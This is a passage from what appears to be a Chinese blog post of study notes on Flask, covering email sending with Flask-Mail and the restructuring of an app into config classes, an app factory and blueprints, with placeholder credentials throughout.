class="string">&#x27;MAIL_SERVER&#x27;</span>] = <span class="string">&#x27;smtp.googlemail.com&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_PORT&#x27;</span>] = <span class="number">587</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_USE_TLS&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_USERNAME&#x27;</span>] = os.environ.get(<span class="string">&#x27;MAIL_USERNAME&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MAIL_PASSWORD&#x27;</span>] = os.environ.get(<span class="string">&#x27;MAIL_PASSWORD&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后在系统shell里面设置环境变量(防止信息泄露),只在当前命令行下有效</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line">export MAIL_USERNAME=&lt;Gmail username&gt;</span><br><span class="line">export MAIL_PASSWORD=&lt;Gmail password&gt;</span><br><span class="line"><span class="comment"># Windows </span></span><br><span class="line"><span class="built_in">set</span> MAIL_USERNAME=&lt;Gmail username&gt;</span><br><span class="line"><span class="built_in">set</span> MAIL_PASSWORD=&lt;Gmail password&gt;</span><br></pre></td></tr></table></figure><p>QQmail SMTP服务使用: <a href="https://blog.csdn.net/qq_28388339/article/details/87898940">https://blog.csdn.net/qq_28388339/article/details/87898940</a></p><p>qq mail使用: <code>MAIL_DEFAULT_SENDER/SENDER</code>和<code>MAIL_USERNAME</code>必须保持一致</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Mail, Message</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;MAIL_DEBUG&#x27;</span>] = <span class="literal">True</span>             <span class="comment"># 开启debug，便于调试看信息</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_SUPPRESS_SEND&#x27;</span>] = <span class="literal">False</span>    <span class="comment"># 发送邮件，为True则不发送</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_SERVER&#x27;</span>] = <span class="string">&#x27;smtp.qq.com&#x27;</span>   <span class="comment"># 邮箱服务器</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_PORT&#x27;</span>] = <span class="number">465</span>               <span class="comment"># 端口</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_USE_SSL&#x27;</span>] = <span class="literal">True</span>           <span class="comment"># 重要，qq邮箱需要使用SSL</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_USE_TLS&#x27;</span>] = <span class="literal">False</span>          <span class="comment"># 不需要使用TLS</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_USERNAME&#x27;</span>] = <span class="string">&#x27;xxxxxxxxx@qq.com&#x27;</span> <span class="comment"># qq Mail</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_PASSWORD&#x27;</span>] = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span> <span class="comment"># 授权码</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_DEFAULT_SENDER&#x27;</span>] = <span class="string">&#x27;xxxxxxxxx@qq.com&#x27;</span>  <span class="comment"># 填邮箱，默认发送者</span></span><br><span class="line">mail = Mail(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    msg = Message(subject=<span class="string">&#x27;Hello World&#x27;</span>,</span><br><span class="line">                  sender=<span class="string">&quot;xxxxxxxxx@qq.com&quot;</span>,  <span class="comment"># 需要使用默认发送者则不用填</span></span><br><span class="line">                  recipients=[<span class="string">&#x27;xxxxxxxxx@qq.com&#x27;</span>])</span><br><span class="line">    msg.body = <span class="string">&#x27;sended by flask-email&#x27;</span></span><br><span class="line">    msg.html = <span class="string">&#x27;&lt;b&gt;测试Flask发送邮件&lt;b&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context(): </span><br><span class="line">        <span class="comment"># Flask-Mail 中的 send() 函数使用 current_app ，因此要在激活的程序上下文中执行</span></span><br><span class="line">        mail.send(msg)</span><br></pre></td></tr></table></figure><ul><li>异步发送电子邮件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Mail, Message</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;MAIL_DEBUG&#x27;</span>] = <span class="literal">True</span>             <span class="comment"># 开启debug，便于调试看信息</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_SUPPRESS_SEND&#x27;</span>] = <span class="literal">False</span>    <span class="comment"># 发送邮件，为True则不发送</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_SERVER&#x27;</span>] = <span class="string">&#x27;smtp.qq.com&#x27;</span>   <span class="comment"># 邮箱服务器</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_PORT&#x27;</span>] = <span class="number">465</span>               <span class="comment"># 端口</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_USE_SSL&#x27;</span>] = <span class="literal">True</span>           <span class="comment"># 重要，qq邮箱需要使用SSL</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_USE_TLS&#x27;</span>] = <span class="literal">False</span>          <span class="comment"># 不需要使用TLS</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_USERNAME&#x27;</span>] = <span class="string">&#x27;xxxxxxxxx@qq.com&#x27;</span> <span class="comment"># qq Mail</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_PASSWORD&#x27;</span>] = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span> <span class="comment"># 授权码</span></span><br><span class="line">app.config[<span class="string">&#x27;MAIL_DEFAULT_SENDER&#x27;</span>] = <span class="string">&#x27;xxxxxxxxx@qq.com&#x27;</span>  <span class="comment"># 填邮箱，默认发送者</span></span><br><span class="line">mail = Mail(app)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_async_email</span>(<span class="params">app, msg</span>):</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        mail.send(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    msg = Message(subject=<span class="string">&#x27;Hello World&#x27;</span>,</span><br><span class="line">                  sender=<span class="string">&quot;xxxxxxxxx@qq.com&quot;</span>,  <span class="comment"># 需要使用默认发送者则不用填</span></span><br><span class="line">                  recipients=[<span class="string">&#x27;xxxxxxxxx@qq.com&#x27;</span>])</span><br><span class="line">    msg.body = <span class="string">&#x27;sended by flask-email&#x27;</span></span><br><span class="line">    msg.html = <span class="string">&#x27;&lt;b&gt;测试Flask发送邮件&lt;b&gt;&#x27;</span></span><br><span class="line">    thr = Thread(target=send_async_email, args=[app, msg])</span><br><span class="line">    thr.start()</span><br></pre></td></tr></table></figure><h2 id="第七章-大型程序的结构"><a href="#第七章-大型程序的结构" class="headerlink" title="第七章 大型程序的结构"></a>第七章 大型程序的结构</h2><p>调整一下结构就成下面这样了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">├─app</span><br><span class="line">│  │--email.py</span><br><span class="line">│  │--models.py</span><br><span class="line">│  │--__init__.py</span><br><span class="line">│  ├─main</span><br><span class="line">│  │    |--errors.py</span><br><span class="line">│  │    |--forms.py</span><br><span class="line">│  │    |--views.py</span><br><span class="line">│  │    |--__init__.py</span><br><span class="line">│  ├─static</span><br><span class="line">│  │</span><br><span class="line">│  └─templates</span><br><span class="line">│      │--404.html</span><br><span class="line">│      │--index.html</span><br><span class="line">|    | ... 省略一些</span><br><span class="line">│      └─mail</span><br><span class="line">│             |--new_user.html</span><br><span class="line">│             |--new_user.txt</span><br><span class="line">│--config.py</span><br><span class="line">│--manage.py</span><br><span class="line">├─tests</span><br><span class="line">│     |--test_basics.py</span><br><span class="line">│     |--__init__.py</span><br><span class="line">│--data-dev.sqlite</span><br><span class="line">│--data-test.sqlite</span><br><span class="line">│--data.sqlite</span><br><span class="line">│--requirements.txt</span><br><span class="line">│--tree.txt</span><br><span class="line">├─migrations</span><br><span class="line">├─venv</span><br><span class="line">└─.idea</span><br></pre></td></tr></table></figure><p>最主要的就是app文件夹,然后config.py是配置文件,manage.py是启动管理文件</p><p>tests文件夹里面是测试文件</p><p>然后还要数据库文件等等.</p><p>分析一下这个结构</p><h3 id="配置选项的改动"><a href="#配置选项的改动" class="headerlink" title="配置选项的改动"></a>配置选项的改动</h3><p>配置选项集成到了一个文件config.py, 下面是代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 层次结构的配置类</span></span><br><span class="line"><span class="comment"># 基类 Config 通用配置</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>:</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;hard to guess string&#x27;</span></span><br><span class="line">    SQLALCHEMY_COMMIT_ON_TEARDOWN = <span class="literal">True</span></span><br><span class="line">    FLASKY_MAIL_SUBJECT_PREFIX = <span class="string">&#x27;[Flasky]&#x27;</span></span><br><span class="line"></span><br><span class="line">    FLASKY_MAIL_SENDER = <span class="string">&#x27;xxxxxxxx@xx.com&#x27;</span></span><br><span class="line">    FLASKY_ADMIN = <span class="string">&#x27;xxxxxxx@xx.com&#x27;</span></span><br><span class="line"></span><br><span class="line">    MAIL_SERVER = <span class="string">&#x27;smtp.qq.com&#x27;</span></span><br><span class="line">    MAIL_PORT = <span class="number">465</span></span><br><span class="line">    MAIL_USE_SSL = <span class="literal">True</span></span><br><span class="line">    MAIL_USE_TLS = <span class="literal">False</span></span><br><span class="line">    MAIL_USERNAME = <span class="string">&#x27;xxxxxxxx@xx.com&#x27;</span></span><br><span class="line">    MAIL_PASSWORD = <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_app</span>(<span class="params">app</span>):</span>  <span class="comment"># 参数是程序实例</span></span><br><span class="line">        <span class="keyword">pass</span>            <span class="comment"># 可以执行对当前环境的配置初始化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开发环境配置</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DevelopmentConfig</span>(<span class="params">Config</span>):</span></span><br><span class="line">    DEBUG = <span class="literal">True</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.environ.get(<span class="string">&#x27;DEV_DATABASE_URL&#x27;</span>) <span class="keyword">or</span> \</span><br><span class="line">                <span class="string">&#x27;sqlite:///&#x27;</span> + os.path.join(basedir, <span class="string">&#x27;data-dev.sqlite&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试环境配置</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestingConfig</span>(<span class="params">Config</span>):</span></span><br><span class="line">    TESTING = <span class="literal">True</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.environ.get(<span class="string">&#x27;TEST_DATABASE_URL&#x27;</span>) <span class="keyword">or</span> \</span><br><span class="line">                <span class="string">&#x27;sqlite:///&#x27;</span> + os.path.join(basedir, <span class="string">&#x27;data-test.sqlite&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生产环境配置</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProductionConfig</span>(<span class="params">Config</span>):</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.environ.get(<span class="string">&#x27;DATABASE_URL&#x27;</span>) <span class="keyword">or</span> \</span><br><span class="line">                <span class="string">&#x27;sqlite:///&#x27;</span> + os.path.join(basedir, <span class="string">&#x27;data.sqlite&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">config = &#123;</span><br><span class="line">    <span class="string">&#x27;development&#x27;</span>: DevelopmentConfig,</span><br><span class="line">    <span class="string">&#x27;testing&#x27;</span>: TestingConfig,</span><br><span class="line">    <span class="string">&#x27;production&#x27;</span>: ProductionConfig,</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: DevelopmentConfig</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    一种配置写成一种类,有基类Config,然后别的配置类安装需求由基类派生出来</p><p>​    值得注意的是配置基类中有一个init_app()方法.这个方法在app工厂里面用来初始化扩展</p><h3 id="然后是最主要的app包"><a href="#然后是最主要的app包" class="headerlink" title="然后是最主要的app包"></a>然后是最主要的app包</h3><p>里面集成了static静态文件, templates模板文件(里面有一个mail文件夹放着mail模板)</p><p>然后为了更改配置,使用工厂函数.在<code>app/__init.py__</code> 中定义.内容如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Mail</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">bootstrap = Bootstrap()</span><br><span class="line">mail = Mail()</span><br><span class="line">moment = Moment()</span><br><span class="line">db = SQLAlchemy()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span>(<span class="params">config_name</span>):</span></span><br><span class="line">    app = Flask(__name__)</span><br><span class="line">    app.config.from_object(config[config_name]) <span class="comment"># 加载配置文件</span></span><br><span class="line">    config[config_name].init_app(app)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># init_app</span></span><br><span class="line">    bootstrap.init_app(app)</span><br><span class="line">    mail.init_app(app)</span><br><span class="line">    moment.init_app(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 附加路由和自定义的错误页面</span></span><br><span class="line">    <span class="keyword">from</span> .main <span class="keyword">import</span> main <span class="keyword">as</span> main_blueprint</span><br><span class="line">    app.register_blueprint(main_blueprint)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> app  <span class="comment"># 工厂函数返回创建的程序示例</span></span><br></pre></td></tr></table></figure><p>在这里面集成和初始化Flask的扩展.返回一个实例化对象.</p><p>主要函数就是<code>create_app()</code> , 同时还要在里面注册蓝本,来导入路由等</p><blockquote><p>然而并没看懂哪里有优势了,更难懂了.其中部分代码还不是很理解.后面再看</p></blockquote><h3 id="路由-蓝本"><a href="#路由-蓝本" class="headerlink" title="路由-蓝本"></a>路由-蓝本</h3><p>然后在一个叫蓝本里面的东西定义路由之类的.需要在一个包里面.就是结构中的main文件夹</p><p>然后在 <code>app/main/__init__.py</code> 初始化这个蓝本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line"><span class="comment"># 通过实例化一个 Blueprint 类对象创建蓝本</span></span><br><span class="line">main = Blueprint(<span class="string">&#x27;main&#x27;</span>, __name__)</span><br><span class="line"><span class="comment"># 两个参数 蓝本的名字和蓝本所在的包或模块</span></span><br><span class="line"><span class="comment"># 一定要在最后导入,否则可能循环导入</span></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views, errors <span class="comment"># 导入路由和错误处理的路由</span></span><br></pre></td></tr></table></figure><p>然后views.py 就是一些视图函数.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, session, redirect, url_for, current_app</span><br><span class="line"><span class="comment"># . 是当前路径, ..就是上一级路径</span></span><br><span class="line"><span class="keyword">from</span> .. <span class="keyword">import</span> db <span class="comment"># 引入app/__init__下的数据库对象</span></span><br><span class="line"><span class="keyword">from</span> ..models <span class="keyword">import</span> User <span class="comment"># User类</span></span><br><span class="line"><span class="keyword">from</span> ..email <span class="keyword">import</span> send_email <span class="comment"># send_email函数</span></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> main <span class="comment"># 引入整个蓝本</span></span><br><span class="line"><span class="keyword">from</span> .forms <span class="keyword">import</span> NameForm <span class="comment"># 引入Form类</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># main.route</span></span><br><span class="line"><span class="meta">@main.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.name.data).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            user = User(username=form.name.data)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            session[<span class="string">&#x27;known&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> current_app.config[<span class="string">&#x27;FLASKY_ADMIN&#x27;</span>]:</span><br><span class="line">                send_email(current_app.config[<span class="string">&#x27;FLASKY_ADMIN&#x27;</span>], <span class="string">&#x27;New User&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;mail/new_user&#x27;</span>, user=user)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;known&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = form.name.data</span><br><span class="line"><span class="comment"># Flask 会为蓝本中的全部端点加上一个命名空间,命名空间就是蓝本的名字</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;.index&#x27;</span>))</span><br><span class="line"><span class="comment">#  url_for(&#x27;main.index&#x27;)或者胜利main url_for(&#x27;.index&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line">                           current_time=datetime.utcnow(),</span><br><span class="line">                           form=form, name=session.get(<span class="string">&#x27;name&#x27;</span>),</span><br><span class="line">                           known=session.get(<span class="string">&#x27;known&#x27;</span>, <span class="literal">False</span>))</span><br></pre></td></tr></table></figure><p>errors.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">#@main.app_errorhandler</span></span><br><span class="line"><span class="meta">@main.app_errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@main.app_errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br></pre></td></tr></table></figure><p>这里使用的是<code>@main.app_errorhandler</code>而不是 <code>@main.errorhandler</code></p><p><code> errorhandler</code>:只处理蓝本里面的错误</p><p><code>app_errorhandler</code>:处理全局错误</p><p>然后不知道forms.py为啥也在蓝本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span>(<span class="params">FlaskForm</span>):</span></span><br><span class="line">    name = StringField(<span class="string">&#x27;What is your name?&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Submit&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a>启动脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> create_app, db</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User, Role</span><br><span class="line"><span class="keyword">from</span> flask_script <span class="keyword">import</span> Manager, Shell</span><br><span class="line"><span class="keyword">from</span> flask_migrate <span class="keyword">import</span> Migrate, MigrateCommand</span><br><span class="line"></span><br><span class="line">app = create_app(os.getenv(<span class="string">&#x27;FLASK_CONFIG&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">manager = Manager(app)</span><br><span class="line">migrate = Migrate(app, db)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_shell_context</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(app=app, db=db, User=User, Role=Role)</span><br><span class="line"></span><br><span class="line">manager.add_command(<span class="string">&quot;shell&quot;</span>, Shell(make_context=make_shell_context))</span><br><span class="line">manager.add_command(<span class="string">&#x27;db&#x27;</span>, MigrateCommand)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul><li><p>requirements.txt可以用这条命令生成<code>pip freeze &gt;requirements.txt</code></p></li><li><p> <code>pip install -r requirements.txt</code></p></li><li><p>单元测试,书中给了如下的代码,讲解也很少</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> current_app</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> 